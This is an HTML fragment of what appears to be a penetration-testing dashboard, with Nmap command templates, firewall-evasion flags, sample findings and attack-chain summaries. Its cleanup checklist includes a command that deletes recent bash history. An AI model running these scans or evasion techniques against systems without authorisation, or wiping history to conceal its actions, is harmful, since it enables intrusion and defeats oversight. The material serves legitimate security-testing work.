                                <div class="action-item" data-status="pending" data-category="reconnaissance" onclick="openActionModal('email-harvesting')">
                                    <div class="action-header">
                                        <div class="action-status pending"></div>
                                        <div class="action-info">
                                            <h4 class="action-title">Email Harvesting</h4>
                                            <p class="action-description">Collect email addresses for social engineering assessment</p>
                                        </div>
                                        <div class="action-meta">
                                            <span class="action-tool"> theHarvester</span>
                                            <span class="action-time">1h</span>
                                        </div>
                                    </div>
                                    <div class="action-details">
                                        <div class="action-techniques">
                                            <span class="technique-tag">Search Engine Mining</span>
                                            <span class="technique-tag">LinkedIn Scraping</span>
                                        </div>
                                    </div>
                                </div>

                                <div class="action-item" data-status="pending" data-category="reconnaissance" onclick="openActionModal('network-topology')">
                                    <div class="action-header">
                                        <div class="action-status pending"></div>
                                        <div class="action-info">
                                            <h4 class="action-title">Network Topology Mapping</h4>
                                            <p class="action-description">Map network structure and identify critical infrastructure</p>
                                        </div>
                                        <div class="action-meta">
                                            <span class="action-tool"> Traceroute</span>
                                            <span class="action-time">2h</span>
                                        </div>
                                    </div>
                                    <div class="action-details">
                                        <div class="action-techniques">
                                            <span class="technique-tag">Route Tracing</span>
                                            <span class="technique-tag">Network Mapping</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Action Detail Modal -->
                <div class="modal-overlay" id="actionModalOverlay" onclick="closeActionModal()">
                    <div class="action-modal" onclick="event.stopPropagation()">
                        <div class="modal-header">
                            <div class="modal-title-section">
                                <h2 class="modal-title" id="actionModalTitle">Port Scanning</h2>
                                <div class="modal-subtitle">
                                    <span class="action-category"> Reconnaissance</span>
                                    <span class="action-status-badge in-progress"> In Progress</span>
                                </div>
                            </div>
                            <button class="modal-close" onclick="closeActionModal()"></button>
                        </div>

                        <div class="modal-content">
                            <div class="modal-nav">
                                <button class="modal-nav-btn active" data-tab="overview" onclick="switchModalTab('overview')"> Overview</button>
                                <button class="modal-nav-btn" data-tab="commands" onclick="switchModalTab('commands')"> Commands</button>
                                <button class="modal-nav-btn" data-tab="media" onclick="switchModalTab('media')"> Media</button>
                                <button class="modal-nav-btn" data-tab="troubleshooting" onclick="switchModalTab('troubleshooting')"> Issues</button>
                                <button class="modal-nav-btn" data-tab="findings" onclick="switchModalTab('findings')"> Findings</button>
                                <button class="modal-nav-btn" data-tab="cleanup" onclick="switchModalTab('cleanup')"> Cleanup</button>
                            </div>

                            <div class="modal-tab-content">
                                <!-- Overview Tab -->
                                <div class="modal-tab active" id="tab-overview">
                                    <div class="tab-section">
                                        <h3 class="section-title"> Objective</h3>
                                        <p class="section-content">Identify open ports and running services on target hosts to understand the attack surface and potential entry points for further testing.</p>
                                    </div>

                                    <div class="tab-section">
                                        <h3 class="section-title"> Tool Information</h3>
                                        <div class="tool-info-grid">
                                            <div class="tool-info-card">
                                                <h4>Primary Tool: Nmap</h4>
                                                <div class="tool-details">
                                                    <div class="tool-detail">
                                                        <span class="detail-label">Platform:</span>
                                                        <span class="detail-value">Linux, Windows, macOS</span>
                                                    </div>
                                                    <div class="tool-detail">
                                                        <span class="detail-label">Version:</span>
                                                        <span class="detail-value">7.94+ recommended</span>
                                                    </div>
                                                    <div class="tool-detail">
                                                        <span class="detail-label">Installation:</span>
                                                        <span class="detail-value">apt install nmap</span>
                                                    </div>
                                                    <div class="tool-detail">
                                                        <span class="detail-label">Prerequisites:</span>
                                                        <span class="detail-value">Root privileges for SYN scans</span>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="tool-info-card">
                                                <h4>Alternative: Masscan</h4>
                                                <div class="tool-details">
                                                    <div class="tool-detail">
                                                        <span class="detail-label">Use Case:</span>
                                                        <span class="detail-value">Large network ranges</span>
                                                    </div>
                                                    <div class="tool-detail">
                                                        <span class="detail-label">Speed:</span>
                                                        <span class="detail-value">~10M packets/second</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="tab-section">
                                        <h3 class="section-title"> Techniques</h3>
                                        <div class="techniques-grid">
                                            <div class="technique-card">
                                                <h4>TCP SYN Scan</h4>
                                                <p>Stealthy scan technique that doesn't complete TCP handshake</p>
                                                <div class="technique-tags">
                                                    <span class="tag">Stealth</span>
                                                    <span class="tag">Fast</span>
                                                </div>
                                            </div>
                                            <div class="technique-card">
                                                <h4>Service Detection</h4>
                                                <p>Identifies service versions and application details</p>
                                                <div class="technique-tags">
                                                    <span class="tag">Detailed</span>
                                                    <span class="tag">Fingerprinting</span>
                                                </div>
                                            </div>
                                            <div class="technique-card">
                                                <h4>OS Fingerprinting</h4>
                                                <p>Determines target operating system</p>
                                                <div class="technique-tags">
                                                    <span class="tag">Advanced</span>
                                                    <span class="tag">Reconnaissance</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="tab-section">
                                        <h3 class="section-title"> Expected Outcomes</h3>
                                        <div class="outcomes-list">
                                            <div class="outcome-item">
                                                <span class="outcome-icon"></span>
                                                <span>Open port inventory with service identification</span>
                                            </div>
                                            <div class="outcome-item">
                                                <span class="outcome-icon"></span>
                                                <span>Service version information for vulnerability assessment</span>
                                            </div>
                                            <div class="outcome-item">
                                                <span class="outcome-icon"></span>
                                                <span>Operating system identification</span>
                                            </div>
                                            <div class="outcome-item">
                                                <span class="outcome-icon"></span>
                                                <span>Attack surface mapping</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <!-- Commands Tab -->
                                <div class="modal-tab" id="tab-commands">
                                    <div class="tab-section">
                                        <h3 class="section-title"> Command Templates</h3>
                                        
                                        <div class="command-card">
                                            <div class="command-header">
                                                <h4>Basic TCP SYN Scan</h4>
                                                <button class="copy-btn" onclick="copyToClipboard('basic-syn')"> Copy</button>
                                            </div>
                                            <div class="command-template" id="basic-syn">
                                                <code>nmap -sS -T4 -p- {{TARGET_IP}}</code>
                                            </div>
                                            <div class="command-description">
                                                <strong>Flags:</strong> -sS (SYN scan), -T4 (aggressive timing), -p- (all ports)
                                            </div>
                                            <div class="command-placeholders">
                                                <span class="placeholder-tag">{{TARGET_IP}}</span> - Replace with target IP or range
                                            </div>
                                        </div>

                                        <div class="command-card">
                                            <div class="command-header">
                                                <h4>Service Version Detection</h4>
                                                <button class="copy-btn" onclick="copyToClipboard('service-scan')"> Copy</button>
                                            </div>
                                            <div class="command-template" id="service-scan">
                                                <code>nmap -sV -sC -O -T4 -p {{OPEN_PORTS}} {{TARGET_IP}}</code>
                                            </div>
                                            <div class="command-description">
                                                <strong>Flags:</strong> -sV (version detection), -sC (default scripts), -O (OS detection)
                                            </div>
                                            <div class="command-placeholders">
                                                <span class="placeholder-tag">{{OPEN_PORTS}}</span> - Comma-separated port list (e.g., 22,80,443)<br>
                                                <span class="placeholder-tag">{{TARGET_IP}}</span> - Target IP address
                                            </div>
                                        </div>

                                        <div class="command-card">
                                            <div class="command-header">
                                                <h4>Comprehensive Network Scan</h4>
                                                <button class="copy-btn" onclick="copyToClipboard('network-scan')"> Copy</button>
                                            </div>
                                            <div class="command-template" id="network-scan">
                                                <code>nmap -sS -sV -sC -O -A -T4 -oA {{OUTPUT_FILE}} {{NETWORK_RANGE}}</code>
                                            </div>
                                            <div class="command-description">
                                                <strong>Flags:</strong> -A (aggressive scan), -oA (output in all formats)
                                            </div>
                                            <div class="command-placeholders">
                                                <span class="placeholder-tag">{{OUTPUT_FILE}}</span> - Output filename prefix<br>
                                                <span class="placeholder-tag">{{NETWORK_RANGE}}</span> - Network range (e.g., 192.168.1.0/24)
                                            </div>
                                        </div>

                                        <div class="command-card">
                                            <div class="command-header">
                                                <h4>Top Ports Quick Scan</h4>
                                                <button class="copy-btn" onclick="copyToClipboard('quick-scan')"> Copy</button>
                                            </div>
                                            <div class="command-template" id="quick-scan">
                                                <code>nmap -sS -T5 --top-ports 1000 {{TARGET_RANGE}}</code>
                                            </div>
                                            <div class="command-description">
                                                <strong>Use Case:</strong> Fast initial reconnaissance of common ports
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <!-- Media Tab -->
                                <div class="modal-tab" id="tab-media">
                                    <div class="tab-section">
                                        <h3 class="section-title"> Video Demonstrations</h3>
                                        
                                        <div class="media-grid">
                                            <div class="media-card">
                                                <div class="media-thumbnail">
                                                    <div class="play-button"></div>
                                                    <img src="https://via.placeholder.com/300x180?text=Nmap+Basics" alt="Nmap Basics">
                                                </div>
                                                <div class="media-info">
                                                    <h4>Nmap Fundamentals</h4>
                                                    <p>Complete guide to basic Nmap scanning techniques</p>
                                                    <div class="media-meta">
                                                        <span class="duration">12:45</span>
                                                        <span class="difficulty">Beginner</span>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="media-card">
                                                <div class="media-thumbnail">
                                                    <div class="play-button"></div>
                                                    <img src="https://via.placeholder.com/300x180?text=Advanced+Scanning" alt="Advanced Scanning">
                                                </div>
                                                <div class="media-info">
                                                    <h4>Advanced Scanning Techniques</h4>
                                                    <p>Service detection, OS fingerprinting, and NSE scripts</p>
                                                    <div class="media-meta">
                                                        <span class="duration">18:30</span>
                                                        <span class="difficulty">Intermediate</span>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="media-card">
                                                <div class="media-thumbnail">
                                                    <div class="play-button"></div>
                                                    <img src="https://via.placeholder.com/300x180?text=Stealth+Scanning" alt="Stealth Techniques">
                                                </div>
                                                <div class="media-info">
                                                    <h4>Stealth Scanning Methods</h4>
                                                    <p>Evading detection and firewall bypasses</p>
                                                    <div class="media-meta">
                                                        <span class="duration">15:20</span>
                                                        <span class="difficulty">Advanced</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="tab-section">
                                        <h3 class="section-title"> Documentation Links</h3>
                                        <div class="docs-links">
                                            <a href="#" class="doc-link">
                                                <span class="doc-icon"></span>
                                                <span>Official Nmap Documentation</span>
                                                <span class="external-icon"></span>
                                            </a>
                                            <a href="#" class="doc-link">
                                                <span class="doc-icon"></span>
                                                <span>Nmap NSE Script Database</span>
                                                <span class="external-icon"></span>
                                            </a>
                                            <a href="#" class="doc-link">
                                                <span class="doc-icon"></span>
                                                <span>Port Scanning Best Practices</span>
                                                <span class="external-icon"></span>
                                            </a>
                                        </div>
                                    </div>
                                </div>

                                <!-- Troubleshooting Tab -->
                                <div class="modal-tab" id="tab-troubleshooting">
                                    <div class="tab-section">
                                        <h3 class="section-title"> Common Issues & Solutions</h3>
                                        
                                        <div class="issue-accordion">
                                            <div class="issue-item">
                                                <div class="issue-header" onclick="toggleIssue('issue1')">
                                                    <h4> "Operation not permitted" Error</h4>
                                                    <span class="issue-toggle">+</span>
                                                </div>
                                                <div class="issue-content" id="issue1">
                                                    <div class="issue-solution">
                                                        <p><strong>Cause:</strong> Insufficient privileges for raw socket access</p>
                                                        <p><strong>Solution:</strong></p>
                                                        <ul>
                                                            <li>Run as root: <code>sudo nmap ...</code></li>
                                                            <li>Use unprivileged scan: <code>nmap -sT</code> (TCP connect scan)</li>
                                                            <li>Grant capabilities: <code>sudo setcap cap_net_raw+ep /usr/bin/nmap</code></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="issue-item">
                                                <div class="issue-header" onclick="toggleIssue('issue2')">
                                                    <h4> Scan Running Too Slowly</h4>
                                                    <span class="issue-toggle">+</span>
                                                </div>
                                                <div class="issue-content" id="issue2">
                                                    <div class="issue-solution">
                                                        <p><strong>Optimization Strategies:</strong></p>
                                                        <ul>
                                                            <li>Increase timing: <code>-T4</code> or <code>-T5</code></li>
                                                            <li>Scan common ports first: <code>--top-ports 1000</code></li>
                                                            <li>Skip host discovery: <code>-Pn</code></li>
                                                            <li>Limit parallelism: <code>--min-parallelism 100</code></li>
                                                            <li>Use faster scan: <code>-sS</code> instead of <code>-sT</code></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="issue-item">
                                                <div class="issue-header" onclick="toggleIssue('issue3')">
                                                    <h4> Firewall Blocking Scans</h4>
                                                    <span class="issue-toggle">+</span>
                                                </div>
                                                <div class="issue-content" id="issue3">
                                                    <div class="issue-solution">
                                                        <p><strong>Evasion Techniques:</strong></p>
                                                        <ul>
                                                            <li>Fragment packets: <code>-f</code> or <code>-ff</code></li>
                                                            <li>Decoy scanning: <code>-D RND:10</code></li>
                                                            <li>Source port spoofing: <code>--source-port 53</code></li>
                                                            <li>Timing delays: <code>-T1</code> or <code>-T2</code></li>
                                                            <li>Idle scan: <code>-sI &lt;zombie_host&gt;</code></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="issue-item">
                                                <div class="issue-header" onclick="toggleIssue('issue4')">
                                                    <h4> No Results or False Negatives</h4>
                                                    <span class="issue-toggle">+</span>
                                                </div>
                                                <div class="issue-content" id="issue4">
                                                    <div class="issue-solution">
                                                        <p><strong>Troubleshooting Steps:</strong></p>
                                                        <ul>
                                                            <li>Verify target is reachable: <code>ping &lt;target&gt;</code></li>
                                                            <li>Skip host discovery: <code>-Pn</code></li>
                                                            <li>Try different scan types: <code>-sU</code> for UDP</li>
                                                            <li>Increase verbosity: <code>-v</code> or <code>-vv</code></li>
                                                            <li>Check network path: <code>traceroute &lt;target&gt;</code></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="tab-section">
                                        <h3 class="section-title"> Risk Considerations</h3>
                                        <div class="risk-grid">
                                            <div class="risk-card high">
                                                <div class="risk-level">High Risk</div>
                                                <h4>Aggressive Timing</h4>
                                                <p>Fast scans (-T4, -T5) may trigger IDS/IPS systems and cause network congestion</p>
                                            </div>
                                            <div class="risk-card medium">
                                                <div class="risk-level">Medium Risk</div>
                                                <h4>Service Disruption</h4>
                                                <p>Extensive scanning may overwhelm services or cause temporary unavailability</p>
                                            </div>
                                            <div class="risk-card low">
                                                <div class="risk-level">Low Risk</div>
                                                <h4>Log Generation</h4>
                                                <p>Port scans generate logs that may alert system administrators</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <!-- Findings Tab -->
                                <div class="modal-tab" id="tab-findings">
                                    <div class="tab-section">
                                        <h3 class="section-title"> Expected Findings</h3>
                                        
                                        <div class="findings-section">
                                            <h4> Common Findings Templates</h4>
                                            <div class="finding-templates">
                                                <div class="finding-template">
                                                    <div class="template-header">
                                                        <h5>Open Administrative Ports</h5>
                                                        <div class="severity critical">Critical</div>
                                                        <button class="use-template-btn" onclick="useTemplate('admin-ports')">Use Template</button>
                                                    </div>
                                                    <div class="template-preview">
                                                        <p><strong>Description:</strong> Administrative services exposed on standard ports (SSH, RDP, Telnet)</p>
                                                        <p><strong>Risk:</strong> Direct access to system administration interfaces</p>
                                                        <p><strong>Recommendation:</strong> Restrict access, change default ports, implement VPN access</p>
                                                    </div>
                                                </div>

                                                <div class="finding-template">
                                                    <div class="template-header">
                                                        <h5>Outdated Service Versions</h5>
                                                        <div class="severity high">High</div>
                                                        <button class="use-template-btn" onclick="useTemplate('outdated-services')">Use Template</button>
                                                    </div>
                                                    <div class="template-preview">
                                                        <p><strong>Description:</strong> Services running outdated versions with known vulnerabilities</p>
                                                        <p><strong>Risk:</strong> Exploitation through known CVEs</p>
                                                        <p><strong>Recommendation:</strong> Update services to latest secure versions</p>
                                                    </div>
                                                </div>

                                                <div class="finding-template">
                                                    <div class="template-header">
                                                        <h5>Unnecessary Services</h5>
                                                        <div class="severity medium">Medium</div>
                                                        <button class="use-template-btn" onclick="useTemplate('unnecessary-services')">Use Template</button>
                                                    </div>
                                                    <div class="template-preview">
                                                        <p><strong>Description:</strong> Non-essential services running and exposed</p>
                                                        <p><strong>Risk:</strong> Expanded attack surface</p>
                                                        <p><strong>Recommendation:</strong> Disable unused services, implement principle of least privilege</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="findings-section">
                                            <h4> Add Custom Finding</h4>
                                            <div class="add-finding-form">
                                                <div class="form-row">
                                                    <input type="text" placeholder="Finding title..." class="finding-input">
                                                    <select class="severity-select">
                                                        <option>Critical</option>
                                                        <option>High</option>
                                                        <option>Medium</option>
                                                        <option>Low</option>
                                                        <option>Informational</option>
                                                    </select>
                                                </div>
                                                <textarea placeholder="Describe the finding..." class="finding-description"></textarea>
                                                <div class="form-actions">
                                                    <button class="add-finding-btn">Add Finding</button>
                                                    <button class="save-template-btn">Save as Template</button>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="findings-section">
                                            <h4> Current Session Findings</h4>
                                            <div class="current-findings">
                                                <div class="finding-item">
                                                    <div class="finding-header">
                                                        <h5>SSH Service Exposed (Port 22)</h5>
                                                        <div class="severity high">High</div>
                                                    </div>
                                                    <p>SSH service detected on standard port with OpenSSH 7.4</p>
                                                    <div class="finding-actions">
                                                        <button class="edit-finding">Edit</button>
                                                        <button class="delete-finding">Delete</button>
                                                    </div>
                                                </div>

                                                <div class="finding-item">
                                                    <div class="finding-header">
                                                        <h5>HTTP Service Banner Disclosure</h5>
                                                        <div class="severity low">Low</div>
                                                    </div>
                                                    <p>Web server reveals detailed version information in HTTP headers</p>
                                                    <div class="finding-actions">
                                                        <button class="edit-finding">Edit</button>
                                                        <button class="delete-finding">Delete</button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <!-- Cleanup Tab -->
                                <div class="modal-tab" id="tab-cleanup">
                                    <div class="tab-section">
                                        <h3 class="section-title"> Cleanup Procedures</h3>
                                        
                                        <div class="cleanup-section">
                                            <h4> Post-Scan Cleanup</h4>
                                            <div class="cleanup-checklist">
                                                <div class="cleanup-item">
                                                    <input type="checkbox" id="cleanup1" class="cleanup-checkbox">
                                                    <label for="cleanup1">Remove temporary scan files and logs</label>
                                                    <div class="cleanup-command">
                                                        <code>rm -f /tmp/nmap_* ~/.nmap/nmap-scan-*</code>
                                                        <button class="copy-btn" onclick="copyCleanupCommand('cleanup1')"></button>
                                                    </div>
                                                </div>

                                                <div class="cleanup-item">
                                                    <input type="checkbox" id="cleanup2" class="cleanup-checkbox">
                                                    <label for="cleanup2">Clear bash history of scan commands</label>
                                                    <div class="cleanup-command">
                                                        <code>history -d $(history | tail -n 10 | head -n 1 | awk '{print $1}'):-1</code>
                                                        <button class="copy-btn" onclick="copyCleanupCommand('cleanup2')"></button>
                                                    </div>
                                                </div>

                                                <div class="cleanup-item">
                                                    <input type="checkbox" id="cleanup3" class="cleanup-checkbox">
                                                    <label for="cleanup3">Verify no persistent connections remain</label>
                                                    <div class="cleanup-command">
                                                        <code>netstat -an | grep {{TARGET_IP}} | wc -l</code>
                                                        <button class="copy-btn" onclick="copyCleanupCommand('cleanup3')"></button>
                                                    </div>
                                                </div>

                                                <div class="cleanup-item">
                                                    <input type="checkbox" id="cleanup4" class="cleanup-checkbox">
                                                    <label for="cleanup4">Document scan results and archive properly</label>
                                                    <div class="cleanup-command">
                                                        <code>mv scan_results.* /path/to/project/evidence/</code>
                                                        <button class="copy-btn" onclick="copyCleanupCommand('cleanup4')"></button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="cleanup-section">
                                            <h4> Target System Impact</h4>
                                            <div class="impact-notes">
                                                <div class="impact-item">
                                                    <div class="impact-icon"></div>
                                                    <div class="impact-content">
                                                        <h5>Log Generation</h5>
                                                        <p>Port scans generate connection logs on target systems. These typically don't require cleanup but should be noted for blue team awareness.</p>
                                                    </div>
                                                </div>

                                                <div class="impact-item">
                                                    <div class="impact-icon"></div>
                                                    <div class="impact-content">
                                                        <h5>Connection States</h5>
                                                        <p>SYN scans leave minimal trace as they don't complete TCP handshake. TCP connect scans may leave brief connection records.</p>
                                                    </div>
                                                </div>

                                                <div class="impact-item">
                                                    <div class="impact-icon"></div>
                                                    <div class="impact-content">
                                                        <h5>Resource Usage</h5>
                                                        <p>Aggressive scans may temporarily increase target system load. Allow time for systems to return to baseline before subsequent testing.</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="cleanup-section">
                                            <h4> Verification Steps</h4>
                                            <div class="verification-steps">
                                                <div class="step-item">
                                                    <div class="step-number">1</div>
                                                    <div class="step-content">
                                                        <h5>Confirm scan completion</h5>
                                                        <p>Verify all target ranges have been scanned and results documented</p>
                                                    </div>
                                                </div>

                                                <div class="step-item">
                                                    <div class="step-number">2</div>
                                                    <div class="step-content">
                                                        <h5>Review findings</h5>
                                                        <p>Ensure all discovered services are properly cataloged for next phase</p>
                                                    </div>
                                                </div>

                                                <div class="step-item">
                                                    <div class="step-number">3</div>
                                                    <div class="step-content">
                                                        <h5>Update methodology status</h5>
                                                        <p>Mark this action as complete and note any deviations from standard procedure</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="modal-footer">
                            <div class="modal-footer-left">
                                <button class="status-btn in-progress"> Mark In Progress</button>
                                <button class="status-btn completed"> Mark Complete</button>
                            </div>
                            <div class="modal-footer-right">
                                <button class="secondary-btn" onclick="exportActionReport()"> Export Report</button>
                                <button class="primary-btn" onclick="closeActionModal()">Close</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="findings">
                    <div class="findings-container">
                        <!-- Findings Header -->
                        <div class="findings-header">
                            <div class="findings-summary">
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">12</div>
                                    <div class="summary-label">Total Findings</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">4</div>
                                    <div class="summary-label">Critical</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: #f59e0b;">5</div>
                                    <div class="summary-label">High</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: #eab308;">2</div>
                                    <div class="summary-label">Medium</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">1</div>
                                    <div class="summary-label">Low</div>
                                </div>
                            </div>
                            
                            <div class="findings-actions">
                                <button class="action-btn secondary" onclick="exportFindings()"> Export</button>
                                <button class="action-btn secondary" onclick="generateReport()"> Generate Report</button>
                                <button class="action-btn primary" onclick="addFinding()">+ Add Finding</button>
                            </div>
                        </div>
                        
                        <!-- Sample Finding Card based on screenshot -->
                        <div class="finding-card critical">
                            <div class="finding-header">
                                <div class="finding-title-section">
                                    <h3 class="finding-title">System Startup Security Vulnerabilities</h3>
                                    <div class="severity-badge critical"> CRITICAL</div>
                                </div>
                                <div class="finding-meta">
                                    <span class="finding-id">#FIND-001</span>
                                    <span class="finding-date">Dec 5, 2024</span>
                                </div>
                            </div>
                            
                            <div class="finding-content">
                                <p>Multiple critical vulnerabilities identified in the embedded system's boot process that could lead to complete system compromise. These vulnerabilities stem from inadequate validation of system initialization processes, allowing for unauthorized access, privilege escalation, and system compromise. These vulnerabilities affect core system initialization processes and could allow attackers to gain persistent access to critical infrastructure components.</p>
                                
                                <div class="vulnerability-highlight">
                                    <p><strong>The analysis of the system startup scripts revealed several high-severity security issues.</strong> The firmware update mechanism (<code>check_firmware_update.sh</code>) implements an insecure update process that validates firmware integrity using MD5 checksums stored in plaintext configuration files. MD5 is cryptographically broken and susceptible to collision attacks, allowing malicious actors to create firmware packages with identical MD5 hashes.</p>
                                </div>
                                
                                <div class="code-section critical">
                                    <div class="severity-header critical">
                                        <span class="severity-icon"></span>
                                        <span>CRITICAL: Insecure MD5 Validation in check_firmware_update.sh</span>
                                        <div class="language-tag language-bash">BASH</div>
                                    </div>
                                    <div class="code-content">
                                        <div class="code-block">
<span class="variable">md5sum_list</span><span class="operator">=</span><span class="function">cat</span> <span class="variable">${FIRMWARE_PATH}</span><span class="variable">${FIRMWARE_CONFIG_FILE}</span> | <span class="function">grep</span> <span class="string">password:</span> | <span class="function">awk</span> 
<span class="operator">-F</span> <span class="string">':'</span> <span class="string">'{print$2}'</span> | <span class="function">awk</span> <span class="operator">-F</span> <span class="string">' '</span> <span class="string">'{print $1}'</span>;<span class="variable">firmware_md5sum</span><span class="operator">=</span><span class="function">md5sum</span> 
<span class="variable">${FIRMWARE_PATH}</span><span class="variable">${FIRMWARE_FILE}</span> | <span class="function">awk</span> <span class="operator">-F</span> <span class="string">' '</span> <span class="string">'{print $1}'</span>;<span class="keyword">for</span> md5sum <span class="keyword">in</span> 
<span class="variable">$md5sum_list</span> <span class="keyword">do</span> <span class="keyword">if</span> [<span class="variable">$firmware_md5sum</span>] = <span class="variable">$md5sum</span>]; <span class="keyword">then</span> <span class="keyword">return</span> 1; <span class="keyword">fi</span> <span class="keyword">done</span>

<span class="keyword">return</span> 0;
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="finding-content">
                                    <p>The system initialization script (<code>emb7502_qwc_startup.sh</code>) executes critical services with excessive privileges, including SSH daemon, SNMP daemon, and Redis servers. The script enables IP forwarding globally without implementing appropriate firewall rules, potentially allowing the</p>
                                </div>
                            </div>
                            
                            <div class="finding-actions">
                                <button class="btn-secondary" onclick="editFinding('FIND-001')"> Edit</button>
                                <button class="btn-secondary" onclick="duplicateFinding('FIND-001')"> Duplicate</button>
                                <button class="btn-secondary" onclick="exportFinding('FIND-001')"> Export</button>
                                <button class="btn-danger" onclick="deleteFinding('FIND-001')"> Delete</button>
                            </div>
                        </div>
                        
                        <!-- Additional findings would go here -->
                        <div class="finding-card high">
                            <div class="finding-header">
                                <div class="finding-title-section">
                                    <h3 class="finding-title">Weak Authentication Mechanisms</h3>
                                    <div class="severity-badge high"> HIGH</div>
                                </div>
                                <div class="finding-meta">
                                    <span class="finding-id">#FIND-002</span>
                                    <span class="finding-date">Dec 5, 2024</span>
                                </div>
                            </div>
                            
                            <div class="finding-content">
                                <p>Multiple services utilize default or weak authentication credentials that could be easily compromised through dictionary attacks or credential stuffing techniques.</p>
                            </div>
                            
                            <div class="finding-actions">
                                <button class="btn-secondary" onclick="editFinding('FIND-002')"> Edit</button>
                                <button class="btn-secondary" onclick="duplicateFinding('FIND-002')"> Duplicate</button>
                                <button class="btn-secondary" onclick="exportFinding('FIND-002')"> Export</button>
                                <button class="btn-danger" onclick="deleteFinding('FIND-002')"> Delete</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="attack-chains">
                    <div class="assets-container">
                        <!-- Attack Chains Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">8</div>
                                    <div class="summary-label">Total Chains</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">3</div>
                                    <div class="summary-label">Critical Paths</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">24</div>
                                    <div class="summary-label">Linked Findings</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">15</div>
                                    <div class="summary-label">Screenshots</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportAttackChains()"> Export Chains</button>
                                <button class="action-btn secondary" onclick="openModal('chainTemplatesModal')"> Templates</button>
                                <button class="action-btn primary" onclick="openModal('newAttackChainModal')">+ New Attack Chain</button>
                            </div>
                        </div>

                        <!-- Attack Chains Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Segment:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterChains('all')">All</button>
                                    <button class="filter-btn" onclick="filterChains('external')"> External</button>
                                    <button class="filter-btn" onclick="filterChains('internal')"> Internal</button>
                                    <button class="filter-btn" onclick="filterChains('web-app')"> Web App</button>
                                    <button class="filter-btn" onclick="filterChains('infrastructure')"> Infrastructure</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Severity:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterChains('critical')">Critical</button>
                                    <button class="filter-btn" onclick="filterChains('high')">High</button>
                                    <button class="filter-btn" onclick="filterChains('medium')">Medium</button>
                                    <button class="filter-btn" onclick="filterChains('low')">Low</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterChains('draft')">Draft</button>
                                    <button class="filter-btn" onclick="filterChains('review')">In Review</button>
                                    <button class="filter-btn" onclick="filterChains('complete')">Complete</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="chainSearch" placeholder="Search chains, findings, narratives..." onkeyup="searchChains()">
                                <button class="search-btn"></button>
                            </div>
                        </div>

                        <!-- Attack Chains Grid -->
                        <div class="attack-chains-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 1.5rem;">
                            <!-- Attack Chain Card 1 -->
                            <div class="chain-card" style="background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="chain-header" style="background: linear-gradient(135deg, var(--danger), #dc2626); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem;"> Complete Domain Compromise</h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">External  Internal  Domain Admin</div>
                                        </div>
                                        <div style="display: flex; flex-direction: column; align-items: end; gap: 0.25rem;">
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Critical</span>
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">External</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Chain Summary:</div>
                                        <div style="font-size: 0.875rem; line-height: 1.4;">Exploitation begins with SQL injection in the public portal, leading to credential harvesting, lateral movement through the internal network, and ultimately achieving domain administrator privileges...</div>
                                    </div>
